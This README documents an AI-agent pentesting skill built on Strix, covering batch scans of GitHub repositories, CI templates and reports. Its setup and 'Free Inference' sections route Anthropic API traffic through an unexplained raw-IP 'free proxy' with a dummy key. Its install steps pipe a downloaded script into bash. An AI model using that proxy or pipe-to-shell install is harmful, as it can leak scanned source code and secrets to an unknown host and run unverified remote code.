# Strix Batch Security Testing Skill

Autonomous AI pentesting for multiple GitHub repositories using parallel agents. Detect, validate, and fix vulnerabilities across your entire application portfolio.

## Quick Start

### 1. Basic Setup

```bash
# Set your LLM provider
export STRIX_LLM="openai/gpt-5.4"
export LLM_API_KEY="sk-..."

# Or use free proxy (from CLAUDE.md)
export ANTHROPIC_BASE_URL="http://31.220.58.212:8082"
export STRIX_LLM="anthropic/claude-sonnet-4-6"
```

### 2. Test a Repo

```bash
./scripts/run-batch-test.sh --target https://github.com/org/repo
```

### 3. Test Multiple Repos

```bash
./scripts/run-batch-test.sh \
  -t https://github.com/org/app1 \
  -t https://github.com/org/app2 \
  -w 3 \
  -r
```

## File Structure

```
strix-batch-security-testing/
├── SKILL.md                           # Full skill documentation
├── README.md                          # This file
├── scripts/
│   ├── batch_security_test.py         # Core batch testing engine
│   ├── github_multi_agent_test.py     # GitHub org/user repo scanning
│   └── run-batch-test.sh              # Easy CLI wrapper
├── templates/
│   ├── QUICKSTART.md                  # Getting started guide
│   ├── github-actions-workflow.yml    # CI/CD workflow
│   ├── batch-config.example.yaml      # Configuration template
│   └── targets.example.txt            # Target list example
└── references/
    └── (security resources)
```

## Features

- **Parallel Agent Orchestration** — Test multiple repos simultaneously
- **Real Exploit Validation** — Working PoCs, not false positives
- **Comprehensive Coverage** — OWASP Top 10 + business logic flaws
- **Auto-Fix Ready** — AI-generated security patches
- **CI/CD Ready** — GitHub Actions, GitLab CI, custom pipelines
- **Compliance Reports** — CVSS scoring, OWASP classification

## Core Scripts

### `batch_security_test.py` - Main Testing Engine

Test multiple targets in parallel with Strix.

```bash
python3 scripts/batch_security_test.py \
  --targets https://github.com/org/repo1 https://github.com/org/repo2 \
  --workers 3 \
  --scan-mode standard \
  --save-report
```

**Options:**
- `--targets` — URLs/repos to test (space-separated)
- `--target-file` — File with targets (one per line)
- `--workers` — Number of parallel agents (default: 3)
- `--scan-mode` — quick|standard|full (default: standard)
- `--save-report` — Save JSON report

### `github_multi_agent_test.py` - GitHub Integration

Discover and test all repos in a GitHub org or user account.

```bash
python3 scripts/github_multi_agent_test.py \
  --org mycompany \
  --workers 3 \
  --create-issues
```

**Options:**
- `--org ORG` — GitHub organization
- `--user USER` — GitHub user
- `--workers` — Parallel agents
- `--create-issues` — Auto-create GitHub issues
- `--language` — Filter by language (e.g., python)

### `run-batch-test.sh` - Convenient Wrapper

Easy-to-use shell wrapper for batch testing.

```bash
./scripts/run-batch-test.sh --target https://github.com/org/repo -r
./scripts/run-batch-test.sh --org mycompany --workers 3
./scripts/run-batch-test.sh --target-file targets.txt --scan-mode quick
```

## Usage Examples

### Example 1: Quick Security Review

```bash
./scripts/run-batch-test.sh \
  --target https://github.com/org/my-app \
  --scan-mode quick
```

### Example 2: Full Org Scan with Reports

```bash
./scripts/run-batch-test.sh \
  --org mycompany \
  --workers 3 \
  --scan-mode standard \
  --save-report \
  --output-dir ./security-reports
```

### Example 3: Batch Test from File

```bash
# Create targets.txt
cat > targets.txt << EOF
https://github.com/org/app1
https://github.com/org/app2
https://github.com/org/api
EOF

./scripts/run-batch-test.sh \
  --target-file targets.txt \
  --workers 5 \
  --save-report
```

### Example 4: GitHub Actions CI/CD

```bash
# Copy workflow to your repo
mkdir -p .github/workflows
cp templates/github-actions-workflow.yml .github/workflows/strix-scan.yml

# Set secrets in GitHub:
# - STRIX_LLM
# - LLM_API_KEY

# Push and the workflow runs on schedule
git add .github/workflows/strix-scan.yml
git commit -m "Add Strix security scanning"
git push
```

## Results

After running tests, you'll get:

```
security-scans/
├── batch-report.json              # Summary report
├── app1/
│   ├── strix_runs/
│   │   ├── findings.json          # Detailed vulnerabilities
│   │   ├── report.html            # HTML report
│   │   └── exploits/              # PoC exploit code
│   └── source/                    # Cloned repository
└── app2/
    └── ...
```

### Report Example

```json
{
  "batch_summary": {
    "total_targets": 3,
    "successful_scans": 3,
    "total_vulnerabilities": 15,
    "severity_breakdown": {
      "critical": 2,
      "high": 5,
      "medium": 8
    }
  },
  "results_by_target": [
    {
      "target": "https://github.com/org/app1",
      "vulnerabilities_found": 8,
      "critical_count": 1
    }
  ]
}
```

## Configuration

### Environment Variables

```bash
# Required
export LLM_API_KEY="sk-..."
export STRIX_LLM="openai/gpt-5.4"

# Optional
export STRIX_REASONING_EFFORT="high"  # quick, medium, high
export GITHUB_TOKEN="ghp_..."         # For repo discovery
export PERPLEXITY_API_KEY="pplx-..."  # For enhanced OSINT
```

### LLM Providers

Supported providers:

| Provider | Config |
|----------|--------|
| OpenAI GPT-5.4 | `openai/gpt-5.4` |
| Anthropic Claude | `anthropic/claude-sonnet-4-6` |
| Google Vertex | `vertex_ai/gemini-3-pro-preview` |
| Local Ollama | `ollama/mistral` |

### Free Inference

Use Anthropic Claude for free through the proxy in CLAUDE.md:

```bash
export ANTHROPIC_BASE_URL="http://31.220.58.212:8082"
export STRIX_LLM="anthropic/claude-sonnet-4-6"
export LLM_API_KEY="dummy"
```

## CI/CD Integration

### GitHub Actions

1. Copy the workflow template:

```bash
cp templates/github-actions-workflow.yml .github/workflows/
```

2. Set repository secrets:
   - `STRIX_LLM`
   - `LLM_API_KEY`

3. Customize trigger schedule in the workflow file

4. Push and done!

### GitLab CI

```yaml
security-scan:
  stage: security
  script:
    - curl -sSL https://strix.ai/install | bash
    - python3 scripts/batch_security_test.py --targets $(pwd) --save-report
  artifacts:
    paths:
      - security-scans/
```

## Troubleshooting

### Issue: "Strix not found"

```bash
curl -sSL https://strix.ai/install | bash
export PATH="$HOME/.strix/bin:$PATH"
```

### Issue: "Docker is not running"

```bash
# Start Docker
docker daemon

# Or use Docker Desktop application
```

### Issue: "LLM rate limits"

```bash
# Use quick scan with reduced reasoning
STRIX_REASONING_EFFORT=medium strix -n -t ./repo --scan-mode quick
```

### Issue: "Targets file not working"

Make sure each target is on its own line:

```
https://github.com/org/repo1
https://github.com/org/repo2
https://example.com/api
```

## Performance Tips

### Faster Scans

```bash
# Use quick mode
./scripts/run-batch-test.sh --scan-mode quick

# Or reduce reasoning effort
export STRIX_REASONING_EFFORT="medium"
```

### Better Coverage

```bash
# Use full scan mode
./scripts/run-batch-test.sh --scan-mode full

# Increase reasoning effort
export STRIX_REASONING_EFFORT="high"
```

## Security Considerations

⚠️ **IMPORTANT:**

- Only test applications you own or have **explicit written permission** to test
- Keep your LLM API keys secure (use env vars, not hardcoded)
- Review findings before applying auto-fixes
- Store credentials securely (use GitHub secrets, not in code)
- Don't commit sensitive data to version control

## Resources

- **Full Documentation**: See `SKILL.md` in this directory
- **Quick Start Guide**: See `templates/QUICKSTART.md`
- **Strix Docs**: https://docs.strix.ai
- **GitHub**: https://github.com/usestrix/strix
- **Discord**: https://discord.gg/strix-ai

## Support

Issues or questions?

1. Check the troubleshooting section above
2. Review `templates/QUICKSTART.md` for examples
3. Visit https://docs.strix.ai
4. Join the Strix Discord community

---

**Ready to scan your repos?** Run:

```bash
./scripts/run-batch-test.sh --help
```
